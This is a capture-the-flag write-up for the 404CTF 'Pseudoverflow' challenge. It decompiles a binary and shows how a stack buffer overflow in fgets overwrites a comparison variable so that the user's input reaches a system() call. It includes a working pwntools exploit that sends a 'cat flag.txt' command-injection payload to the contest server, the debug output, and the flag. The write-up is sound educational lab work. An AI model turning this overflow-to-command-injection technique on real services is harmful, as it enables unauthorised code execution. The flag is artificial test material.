# Pseudoverflow

## Challenge
Course annuelle

Bienvenue à tous dans la course annuelle du 404CTF : les inscriptions sont ouvertes !! Votre pseudo sera-t-il à la hauteur de nos attentes ?

Objectif: lire le fichier flag.txt

## Inputs
- Target: challenges.404ctf.fr:31958
- Binary: [course](./course)

## Analysis
Throwing the binary at `Ghidra` shows the following `main` function:

```c
undefined8 main(void)

{
  int iVar1;
  char local_78 [106];
  undefined4 local_e;
  undefined2 local_a;

  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  local_e = 0x64726570;
  local_a = 0x73;
  puts(&DAT_00102008);
  fgets(local_78,0x100,stdin);
  iVar1 = strcmp((char *)&local_e,"gagne");
  if (iVar1 == 0) {
    win(local_78);
  }
  else {
    puts("Nous vous recontacterons dans les prochaines semaines.");
  }
  return 0;
}
```

The goal is to call function `win`, passing it the input command to be executed by `system` call:

```c
void win(char *param_1)

{
  system(param_1);
  return;
}
```

We can overflow variable `local_78` in the call to `fgets` and write `"gagne"` in next variable `local_e`.

## Solution
We can, for example, send this input command, which will exactly write `"gagne"` in variable `local_e`, pass the string comparison, hit the `win` function and only execute the command `cat flag.txt` in the end, since the rest of the command is commented out:

> cat flag.txt;###gagnegagnegagnegagnegagnegagnegagnegagnegagnegagnegagnegagnegagnegagnegagnegagnegagnegagnegagne\x00

```python
from pwn import *

r = remote('challenges.404ctf.fr', 31958)
# s = b'cat flag.txt;###' + b'gagne'*19 + b'\x00'
s = b'cat flag.txt;###gagnegagnegagnegagnegagnegagnegagnegagnegagnegagnegagnegagnegagnegagnegagnegagnegagnegagnegagne\x00'
assert len(s) == 112

r.recvline()
r.recvline()
r.sendline(s)
r.recvline()
```

Here we see it in action against the target:

```console
$ python3 sol.py DEBUG
[+] Opening connection to challenges.404ctf.fr on port 31958: Done
[DEBUG] Received 0x69 bytes:
    00000000  42 69 65 6e  76 65 6e 75  65 20 c3 a0  20 6c 61 20  │Bien│venu│e ··│ la │
    00000010  63 6f 75 72  73 65 20 61  6e 6e 75 65  6c 6c 65 20  │cour│se a│nnue│lle │
    00000020  64 75 20 34  30 34 43 54  46 21 21 0a  50 6f 75 72  │du 4│04CT│F!!·│Pour│
    00000030  20 70 6f 75  76 6f 69 72  20 70 61 72  74 69 63 69  │ pou│voir│ par│tici│
    00000040  70 65 72 2c  20 6e 6f 75  73 20 61 76  6f 6e 73 20  │per,│ nou│s av│ons │
    00000050  62 65 73 6f  69 6e 20 64  65 20 76 6f  74 72 65 20  │beso│in d│e vo│tre │
    00000060  70 73 65 75  64 6f 20 3a  0a                        │pseu│do :│·│
    00000069
[DEBUG] Sent 0x71 bytes:
    00000000  63 61 74 20  66 6c 61 67  2e 74 78 74  3b 23 23 23  │cat │flag│.txt│;###│
    00000010  67 61 67 6e  65 67 61 67  6e 65 67 61  67 6e 65 67  │gagn│egag│nega│gneg│
    00000020  61 67 6e 65  67 61 67 6e  65 67 61 67  6e 65 67 61  │agne│gagn│egag│nega│
    00000030  67 6e 65 67  61 67 6e 65  67 61 67 6e  65 67 61 67  │gneg│agne│gagn│egag│
    00000040  6e 65 67 61  67 6e 65 67  61 67 6e 65  67 61 67 6e  │nega│gneg│agne│gagn│
    00000050  65 67 61 67  6e 65 67 61  67 6e 65 67  61 67 6e 65  │egag│nega│gneg│agne│
    00000060  67 61 67 6e  65 67 61 67  6e 65 67 61  67 6e 65 00  │gagn│egag│nega│gne·│
    00000070  0a                                                  │·│
    00000071
[DEBUG] Received 0x10 bytes:
    b'404CTF{0v3rfl0w}'
```

## Python code
Complete solution in [sol.py](./sol.py)

## Flag
> 404CTF{0v3rfl0w}
